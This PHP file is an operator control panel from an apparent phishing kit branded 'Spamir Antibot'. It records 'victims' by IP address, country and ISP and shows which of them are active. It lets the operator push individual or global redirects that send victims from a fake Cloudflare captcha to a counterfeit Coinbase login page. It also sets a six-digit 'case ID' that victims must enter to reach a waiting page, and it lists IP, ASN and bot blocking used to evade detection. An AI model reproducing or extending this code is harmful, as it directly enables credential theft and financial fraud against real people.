<?php
// ==================== PROTECTION START ====================
// Start session FIRST
session_start();

// Then include auth and check login
require_once __DIR__ . '/admin/auth.php';

// Check if user is logged in - if not, redirect to login
if (!is_logged_in()) {
    header('Location: /admin/login.php');
    exit;
}

// Then include protection scripts
require_once __DIR__ . '/blocker-raw.php';

// Initialize database connection FIRST
$database = new Database();
$db = $database->getConnection();

// Create necessary tables
try {
    // Create redirect_commands table if not exists
    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
        id SERIAL PRIMARY KEY,
        command VARCHAR(50) NOT NULL,
        target TEXT NOT NULL,
        victim_id INTEGER DEFAULT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_table);
    
    // Ensure victim_id column exists
    $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
    if ($check_column->rowCount() == 0) {
        $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
        $db->exec($alter_table);
    }
} catch (Exception $e) {
    error_log("Redirect commands table error: " . $e->getMessage());
}

// Create victims table if not exists
try {
    $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        user_agent TEXT,
        country VARCHAR(100),
        isp VARCHAR(200),
        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        status VARCHAR(20) DEFAULT 'active',
        page_visited VARCHAR(255) DEFAULT 'index.php',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_victims_table);
} catch (Exception $e) {
    error_log("Victims table error: " . $e->getMessage());
}

// Create case_settings table if not exists
try {
    $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
        id SERIAL PRIMARY KEY,
        setting_name VARCHAR(100) UNIQUE NOT NULL,
        setting_value TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_case_table);
} catch (Exception $e) {
    error_log("Case settings table error: " . $e->getMessage());
}

// Handle logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    logout();
    header('Location: /admin/login.php');
    exit;
}

// Handle all POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle redirect commands
    if (isset($_POST['redirect_command'])) {
        $command = $_POST['redirect_command'];
        $target = $_POST['redirect_target'] ?? '';
        
        switch($command) {
            case 'redirect_to_coinbase':
                $query = "INSERT INTO redirect_commands (command, target, created_at) 
                         VALUES ('redirect', 'coinbaselogin.php', NOW())";
                $_SESSION['success_message'] = 'Victim will be redirected to Coinbase Login';
                break;
                
            case 'redirect_to_cloudflare':
                $query = "INSERT INTO redirect_commands (command, target, created_at) 
                         VALUES ('redirect', 'index.php', NOW())";
                $_SESSION['success_message'] = 'Victim will be redirected to Cloudflare Protection';
                break;
                
            case 'redirect_custom':
                if (!empty($target)) {
                    $query = "INSERT INTO redirect_commands (command, target, created_at) 
                             VALUES ('redirect', :target, NOW())";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':target' => $target]);
                    $_SESSION['success_message'] = 'Victim will be redirected to: ' . $target;
                } else {
                    $_SESSION['error_message'] = 'Please enter a target URL';
                }
                break;
                
            case 'clear_redirect':
                $query = "DELETE FROM redirect_commands WHERE command = 'redirect'";
                $_SESSION['success_message'] = 'Redirect command cleared';
                break;
        }
        
        if (isset($query) && $command !== 'redirect_custom') {
            $db->exec($query);
        }
    }
    
    // Handle victim redirect
    if (isset($_POST['redirect_victim'])) {
        $victim_id = $_POST['victim_id'];
        $redirect_target = $_POST['victim_redirect_target'];
        
        // Update the redirect command for this specific victim
        $query = "INSERT INTO redirect_commands (command, target, victim_id, created_at) 
                 VALUES ('redirect', :target, :victim_id, NOW())";
        $stmt = $db->prepare($query);
        $stmt->execute([
            ':target' => $redirect_target,
            ':victim_id' => $victim_id
        ]);
        
        $_SESSION['success_message'] = 'Redirect command sent to victim';
    }

    // Handle case ID management
    if (isset($_POST['case_id_action'])) {
        $case_id_action = $_POST['case_id_action'];
        
        switch($case_id_action) {
            case 'set_case_id':
                $case_id = $_POST['case_id'] ?? '';
                if (!empty($case_id) && strlen($case_id) === 6 && is_numeric($case_id)) {
                    // Store case ID in database
                    $query = "INSERT INTO case_settings (setting_name, setting_value, created_at) 
                             VALUES ('current_case_id', :case_id, NOW())
                             ON CONFLICT (setting_name) 
                             DO UPDATE SET setting_value = :case_id, created_at = NOW()";
                    $stmt = $db->prepare($query);
                    $stmt->execute([':case_id' => $case_id]);
                    $_SESSION['success_message'] = 'Case ID set to: ' . $case_id;
                } else {
                    $_SESSION['error_message'] = 'Please enter a valid 6-digit case ID';
                }
                break;
                
            case 'clear_case_id':
                $query = "DELETE FROM case_settings WHERE setting_name = 'current_case_id'";
                $db->exec($query);
                $_SESSION['success_message'] = 'Case ID cleared';
                break;
        }
    }
    
    header('Location: /panel.php');
    exit;
}

// Get current redirect
try {
    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
    $stmt = $db->query($query);
    $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    // If victim_id column doesn't exist yet, get without filtering
    try {
        $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
        $stmt = $db->query($query);
        $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e2) {
        $current_redirect = false;
    }
}
$current_redirect = $current_redirect ? $current_redirect['target'] : 'None';

// Get current case ID
$current_case_id = '';
try {
    $case_query = "SELECT setting_value FROM case_settings WHERE setting_name = 'current_case_id'";
    $case_stmt = $db->query($case_query);
    $case_result = $case_stmt->fetch(PDO::FETCH_ASSOC);
    $current_case_id = $case_result ? $case_result['setting_value'] : '';
} catch (Exception $e) {
    error_log("Failed to get case ID: " . $e->getMessage());
}

// Get active victims (last 30 minutes)
$active_victims = [];
try {
    $active_victims_query = "SELECT * FROM victims 
                            WHERE last_activity > NOW() - INTERVAL '30 minutes' 
                            AND status = 'active'
                            ORDER BY last_activity DESC";
    $active_victims_stmt = $db->query($active_victims_query);
    $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    // If last_activity or status columns don't exist yet, get all victims
    try {
        $active_victims_query = "SELECT * FROM victims ORDER BY created_at DESC LIMIT 50";
        $active_victims_stmt = $db->query($active_victims_query);
        $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (Exception $e2) {
        $active_victims = [];
    }
}

// Get total victims count
$total_victims = 0;
try {
    $total_victims_query = "SELECT COUNT(*) as total FROM victims";
    $total_victims_stmt = $db->query($total_victims_query);
    $total_victims_result = $total_victims_stmt->fetch(PDO::FETCH_ASSOC);
    $total_victims = $total_victims_result ? $total_victims_result['total'] : 0;
} catch (PDOException $e) {
    $total_victims = 0;
}

// Handle messages from session
if (isset($_SESSION['success_message'])) {
    $success_message = $_SESSION['success_message'];
    unset($_SESSION['success_message']);
}

if (isset($_SESSION['error_message'])) {
    $error_message = $_SESSION['error_message'];
    unset($_SESSION['error_message']);
}
// ==================== PROTECTION END ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Control Panel - Spamir Antibot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        :root {
            --primary-color: #2196F3;
            --primary-color-light: #64b5f6;
            --primary-color-dark: #1976d2;
            --background-color: #303030;
            --surface-color: #424242;
            --text-color-light: #ffffff;
            --error-color: #f44336;
            --success-color: #4CAF50;
            --warning-color: #FF9800;
        }
        body {
            background-color: var(--background-color);
            color: var(--text-color-light);
            font-family: 'Roboto', sans-serif;
            display: flex;
            min-height: 100vh;
            flex-direction: column;
        }
        main {
            flex: 1 0 auto;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .card {
            background-color: var(--surface-color);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .btn {
            margin: 5px;
        }
        .btn.primary { background-color: var(--primary-color); }
        .btn.success { background-color: var(--success-color); }
        .btn.warning { background-color: var(--warning-color); }
        .btn.danger { background-color: var(--error-color); }
        .btn:hover { opacity: 0.9; }
        
        .input-field label {
            color: var(--text-color-light) !important;
        }
        .input-field input {
            color: var(--text-color-light);
            border-bottom: 1px solid var(--text-color-light) !important;
        }
        .input-field input:focus {
            border-bottom: 1px solid var(--primary-color) !important;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-active { background-color: var(--success-color); }
        .status-inactive { background-color: var(--error-color); }
        .status-pending { background-color: var(--warning-color); }
        
        .victim-status {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .redirect-log {
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;
        }
        
        nav {
            background-color: var(--surface-color) !important;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .message {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            color: var(--text-color-light);
        }
        .message.success { background-color: var(--success-color); }
        .message.error { background-color: var(--error-color); }
        .message.warning { background-color: var(--warning-color); }
        
        .quick-action-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .action-card {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
        }
        .action-card:hover {
            background: rgba(255,255,255,0.1);
            transform: translateY(-2px);
        }
        
        .victim-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        .victim-table th, .victim-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .victim-table th {
            background: rgba(0,0,0,0.3);
            color: var(--primary-color-light);
        }
        .victim-table tr:hover {
            background: rgba(255,255,255,0.05);
        }
        
        .badge {
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 0.8em;
            margin-left: 5px;
        }
        .badge.success { background: var(--success-color); }
        .badge.warning { background: var(--warning-color); }
        .badge.info { background: var(--primary-color); }
        
        .debug-info {
            background: rgba(255,255,255,0.05);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
    <nav>
        <div class="nav-wrapper container">
            <a href="#" class="brand-logo">🛡️ Redirect Control Panel</a>
            <ul id="nav-mobile" class="right hide-on-med-and-down">
                <li><span style="padding: 0 15px;">Welcome, <?php echo $_SESSION['username']; ?></span></li>
                <li><a href="admin/index.php">Link Manager</a></li>
                <li><a href="?action=logout">Logout</a></li>
            </ul>
        </div>
    </nav>

    <main>
        <div class="container">
            <?php
            // Display messages
            if (isset($success_message)) {
                echo "<div class='message success'><i class='material-icons left'>check_circle</i> $success_message</div>";
            }
            if (isset($error_message)) {
                echo "<div class='message error'><i class='material-icons left'>error</i> $error_message</div>";
            }
            ?>

            <!-- Stats Overview -->
            <div class="card">
                <h5>📊 Overview</h5>
                <div class="row">
                    <div class="col s12 m4">
                        <div class="victim-status">
                            <h6>Active Victims</h6>
                            <h4><?php echo count($active_victims); ?> <span class="badge success">Live</span></h4>
                        </div>
                    </div>
                    <div class="col s12 m4">
                        <div class="victim-status">
                            <h6>Total Victims</h6>
                            <h4><?php echo $total_victims; ?> <span class="badge info">All Time</span></h4>
                        </div>
                    </div>
                    <div class="col s12 m4">
                        <div class="victim-status">
                            <h6>Current Redirect</h6>
                            <h4 style="color: #64b5f6;"><?php echo htmlspecialchars($current_redirect); ?></h4>
                        </div>
                    </div>
                </div>
                
                <!-- Debug Info -->
                <div class="debug-info">
                    <strong>Database Status:</strong> 
                    Victims: <?php echo $total_victims; ?>, 
                    Active: <?php echo count($active_victims); ?>,
                    Tables: OK
                </div>
            </div>

            <!-- Active Victims Section -->
            <div class="card">
                <h5>👥 Active Victims (Last 30 minutes)</h5>
                <?php if (count($active_victims) > 0): ?>
                    <table class="victim-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>IP Address</th>
                                <th>Country/ISP</th>
                                <th>Last Activity</th>
                                <th>Current Page</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($active_victims as $victim): ?>
                                <tr>
                                    <td>#<?php echo $victim['id']; ?></td>
                                    <td>
                                        <i class="material-icons tiny">computer</i>
                                        <?php echo htmlspecialchars($victim['ip_address']); ?>
                                    </td>
                                    <td>
                                        <?php 
                                        echo htmlspecialchars($victim['country'] ?? 'Unknown');
                                        if (!empty($victim['isp'])) {
                                            echo '<br><small>' . htmlspecialchars($victim['isp']) . '</small>';
                                        }
                                        ?>
                                    </td>
                                    <td>
                                        <?php 
                                        if (isset($victim['last_activity'])) {
                                            $last_activity = strtotime($victim['last_activity']);
                                            $time_diff = time() - $last_activity;
                                            echo date('H:i:s', $last_activity);
                                            echo '<br><small>' . floor($time_diff / 60) . ' min ago</small>';
                                        } else {
                                            echo 'Unknown';
                                        }
                                        ?>
                                    </td>
                                    <td>
                                        <span class="badge info"><?php echo htmlspecialchars($victim['page_visited'] ?? 'index.php'); ?></span>
                                    </td>
                                    <td>
                                        <form method="POST" style="display: inline;">
                                            <input type="hidden" name="victim_id" value="<?php echo $victim['id']; ?>">
                                            <input type="hidden" name="victim_redirect_target" value="coinbaselogin.php">
                                            <button type="submit" name="redirect_victim" class="btn success btn-small">
                                                <i class="material-icons tiny">login</i> Coinbase
                                            </button>
                                        </form>
                                        <form method="POST" style="display: inline;">
                                            <input type="hidden" name="victim_id" value="<?php echo $victim['id']; ?>">
                                            <input type="hidden" name="victim_redirect_target" value="index.php">
                                            <button type="submit" name="redirect_victim" class="btn primary btn-small">
                                                <i class="material-icons tiny">security</i> Cloudflare
                                            </button>
                                        </form>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php else: ?>
                    <div class="victim-status">
                        <p>No active victims in the last 30 minutes.</p>
                        <p class="grey-text">Victims will appear here after they complete the captcha on your index.php page.</p>
                    </div>
                <?php endif; ?>
            </div>

            <!-- Quick Redirect Actions -->
            <div class="card">
                <h5>🎯 Global Redirect Actions</h5>
                <div class="quick-action-grid">
                    <!-- Redirect to Coinbase Login -->
                    <div class="action-card">
                        <i class="material-icons large">login</i>
                        <h6>Send to Coinbase</h6>
                        <p>Redirect ALL victims to Coinbase login</p>
                        <form method="POST" style="margin: 0;">
                            <input type="hidden" name="redirect_command" value="redirect_to_coinbase">
                            <button type="submit" class="btn success waves-effect waves-light">
                                <i class="material-icons left">send</i>
                                Activate
                            </button>
                        </form>
                    </div>

                    <!-- Redirect to Cloudflare Protection -->
                    <div class="action-card">
                        <i class="material-icons large">security</i>
                        <h6>Send to Cloudflare</h6>
                        <p>Redirect ALL victims back to protection</p>
                        <form method="POST" style="margin: 0;">
                            <input type="hidden" name="redirect_command" value="redirect_to_cloudflare">
                            <button type="submit" class="btn primary waves-effect waves-light">
                                <i class="material-icons left">replay</i>
                                Activate
                            </button>
                        </form>
                    </div>

                    <!-- Clear Redirect -->
                    <div class="action-card">
                        <i class="material-icons large">clear</i>
                        <h6>Clear Redirect</h6>
                        <p>Remove active redirect command</p>
                        <form method="POST" style="margin: 0;">
                            <input type="hidden" name="redirect_command" value="clear_redirect">
                            <button type="submit" class="btn warning waves-effect waves-light">
                                <i class="material-icons left">clear_all</i>
                                Clear
                            </button>
                        </form>
                    </div>
                </div>
            </div>

            <!-- Custom Redirect -->
            <div class="card">
                <h5>🔧 Custom Global Redirect</h5>
                <form method="POST">
                    <div class="row">
                        <div class="input-field col s12 m8">
                            <input type="text" id="custom_target" name="redirect_target" 
                                   placeholder="coinbaselogin.php, index.php, or any URL">
                            <label for="custom_target">Target Page/URL</label>
                        </div>
                        <div class="col s12 m4">
                            <input type="hidden" name="redirect_command" value="redirect_custom">
                            <button type="submit" class="btn primary waves-effect waves-light" style="width: 100%;">
                                <i class="material-icons left">settings</i>
                                Set Global Redirect
                            </button>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col s12">
                            <p class="grey-text">Examples: 
                                <code>coinbaselogin.php</code>, 
                                <code>index.php</code>, 
                                <code>https://example.com</code>
                            </p>
                        </div>
                    </div>
                </form>
            </div>

            <!-- Case ID Management -->
            <div class="card">
                <h5>🔐 Case ID Management</h5>
                <div class="row">
                    <div class="col s12 m6">
                        <div class="victim-status">
                            <h6>Current Case ID</h6>
                            <h4 style="color: #64b5f6;"><?php echo $current_case_id ? htmlspecialchars($current_case_id) : 'Not Set'; ?></h4>
                        </div>
                    </div>
                    <div class="col s12 m6">
                        <form method="POST">
                            <div class="input-field">
                                <input type="text" id="case_id" name="case_id" 
                                       placeholder="Enter 6-digit case ID" maxlength="6" pattern="[0-9]{6}"
                                       value="<?php echo htmlspecialchars($current_case_id); ?>">
                                <label for="case_id">Case ID</label>
                            </div>
                            <div style="margin-top: 15px;">
                                <input type="hidden" name="case_id_action" value="set_case_id">
                                <button type="submit" class="btn success waves-effect waves-light">
                                    <i class="material-icons left">lock</i>
                                    Set Case ID
                                </button>
                                <button type="submit" name="case_id_action" value="clear_case_id" 
                                        class="btn warning waves-effect waves-light">
                                    <i class="material-icons left">clear</i>
                                    Clear
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="row">
                    <div class="col s12">
                        <p class="grey-text">Victims will need to enter this exact 6-digit Case ID to proceed to the waiting page.</p>
                    </div>
                </div>
            </div>

            <!-- System Information -->
            <div class="card">
                <h5>⚙️ System Information</h5>
                <div class="row">
                    <div class="col s12 m6">
                        <p><strong>Server Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                        <p><strong>PHP Version:</strong> <?php echo phpversion(); ?></p>
                        <p><strong>Protected Pages:</strong> index.php, coinbaselogin.php, waiting.php, admin/</p>
                    </div>
                    <div class="col s12 m6">
                        <p><strong>Victim Flow:</strong> index.php → coinbaselogin.php → waiting.php</p>
                        <p><strong>Active Protection:</strong> IP Blocking, ASN Blocking, Bot Detection</p>
                        <p><strong>Session:</strong> <?php echo $_SESSION['username']; ?> (<?php echo $_SERVER['REMOTE_ADDR']; ?>)</p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="page-footer" style="background-color: var(--surface-color); margin-top: 40px;">
        <div class="container">
            <div class="row">
                <div class="col s12">
                    <p class="center-align">&copy; <?php echo date('Y'); ?> Spamir Antibot Redirect Control Panel</p>
                </div>
            </div>
        </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            M.updateTextFields();
        });
    </script>
</body>
</html>
